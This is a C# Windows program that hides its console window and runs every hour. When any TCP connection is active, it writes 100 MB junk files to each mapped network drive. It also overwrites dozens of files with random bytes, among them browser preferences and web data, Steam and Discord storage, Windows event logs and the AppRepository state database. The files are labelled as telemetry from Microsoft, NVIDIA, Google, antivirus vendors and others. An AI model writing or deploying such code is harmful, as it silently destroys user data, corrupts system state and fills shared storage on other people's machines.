using System;
using System.IO;
using System.Net.NetworkInformation;
using System.Threading;
using System.Management; // Add reference to System.Management
using Microsoft.Win32;

class Program
{
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    static void Main(string[] args)
    {
        IntPtr hwnd = GetConsoleWindow();
        if (hwnd != IntPtr.Zero)
        {
            ShowWindow(hwnd, 0); // SW_HIDE = 0
        }

        while (true)
        {
            DateTime startTime = DateTime.Now;
            
            Thread garbageThread = new Thread(FillRemoteDriveWithGarbage);
            garbageThread.Start();
            CorruptTelemetry();

            double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
            double sleepSeconds = Math.Max(3600 - elapsedSeconds, 0);
            
            Console.WriteLine($"Completed run at {DateTime.Now}. Sleeping for {sleepSeconds:F2} seconds until next hour...");
            Thread.Sleep((int)(sleepSeconds * 1000));
        }
    }

    static void FillRemoteDriveWithGarbage()
    {
        try
        {
            var connections = IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections();
            if (connections.Length > 0)
            {
                Console.WriteLine("Incoming connections detected. Filling remote drives with garbage data...");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk WHERE DriveType=4");
                foreach (ManagementObject drive in searcher.Get())
                {
                    string mountPoint = drive["DeviceID"].ToString() + "\\";
                    if (mountPoint.StartsWith(@"\\"))
                    {
                        Console.WriteLine($"Filling drive: {mountPoint}");
                        string filePath = Path.Combine(mountPoint, "garbage_1.dat");
                        try
                        {
                            byte[] garbage = new byte[100 * 1024 * 1024]; // 100 MB
                            new Random().NextBytes(garbage);
                            File.WriteAllBytes(filePath, garbage);
                            Console.WriteLine($"Created garbage file: {filePath}");
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"Drive is full or an error occurred: {e.Message}");
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("No incoming connections detected.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error in FillRemoteDriveWithGarbage: {ex.Message}");
        }
    }

    static void CorruptTelemetry()
    {
        string[] targetFiles = new[]
        {
            // Microsoft telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener_1.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Microsoft\Diagnosis\ETLLogs\ShutdownLogger.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Windows\WebCache\WebCacheV01.dat"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Microsoft\Windows\AppRepository\StateRepository-Deployment.srd"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Microsoft\Diagnosis\eventTranscript\eventTranscript.db"),
            Path.Combine(Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows", @"System32\winevt\Logs\Microsoft-Windows-Telemetry%4Operational.evtx"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data\Default\Preferences"),

            // NVIDIA telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"NVIDIA Corporation\NvTelemetry\NvTelemetryContainer.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"NVIDIA Corporation\NvContainer\NvContainerTelemetry.etl"),

            // Google telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Local Storage\leveldb\*.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\EventLog\*.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Web Data"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Google\Update\GoogleUpdate.log"),

            // Adobe telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Adobe\ARM\log\ARMTelemetry.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Adobe\Creative Cloud\ACC\logs\CoreSync.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Common Files\Adobe\OOBE\PDApp.log"),

            // Intel telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Intel\Telemetry\IntelData.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Intel\Driver Store\Telemetry\IntelGFX.etl"),
            Path.Combine(Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows", @"System32\DriverStore\FileRepository\igdlh64.inf_amd64_*\IntelCPUTelemetry.dat"),

            // AMD telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"AMD\CN\AMDDiag.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"AMD\CN\logs\RadeonSoftware.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"AMD\CNext\CNext\AMDTel.db"),

            // Steam telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Steam\logs\perf.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Steam\htmlcache\Cookies"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Steam\SteamAnalytics.etl"),

            // Epic Games telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Epic\EpicGamesLauncher\Data\EOSAnalytics.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"EpicGamesLauncher\Saved\Logs\EpicGamesLauncher.log"),

            // Discord telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Discord\app-*\modules\discord_analytics\*.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Discord\Local Storage\leveldb\*.ldb"),

            // Autodesk telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Autodesk\Autodesk Desktop App\Logs\AdskDesktopAnalytics.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Autodesk\Adlm\Telemetry\AdlmTelemetry.etl"),

            // Mozilla telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox\Profiles\*\telemetry.sqlite"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Mozilla\Firefox\Telemetry\Telemetry.etl"),

            // Logitech telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Logitech\LogiOptions\logs\LogiAnalytics.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Logitech\LogiSync\Telemetry.etl"),

            // Razer telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Razer\Synapse3\Logs\RazerSynapse.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Razer\Synapse\Telemetry\RazerTelemetry.etl"),

            // Corsair telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Corsair\CUE\logs\iCUETelemetry.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Corsair\iCUE\Analytics\*.etl"),

            // Antivirus telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Kaspersky Lab\AVP*\logs\Telemetry.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"McAfee\Agent\logs\McTelemetry.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Norton\Norton\Logs\NortonAnalytics.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Bitdefender\Bitdefender Security\logs\BDTelemetry.db"),

            // Miscellaneous telemetry files
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Slack\logs\SlackAnalytics.log"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Dropbox\client\logs\DropboxTelemetry.etl"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Zoom\logs\ZoomAnalytics.log")
        };

        foreach (string file in targetFiles)
        {
            OverwriteFile(file);
        }
    }

    static void OverwriteFile(string filePath)
    {
        try
        {
            if (File.Exists(filePath))
            {
                long size = new FileInfo(filePath).Length;
                byte[] junk = new byte[size];
                new Random().NextBytes(junk);
                File.WriteAllBytes(filePath, junk);
                Console.WriteLine($"Overwrote telemetry file: {filePath}");
            }
            else
            {
                Console.WriteLine($"File not found: {filePath}");
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"Error overwriting {filePath}: {e.Message}");
        }
    }
}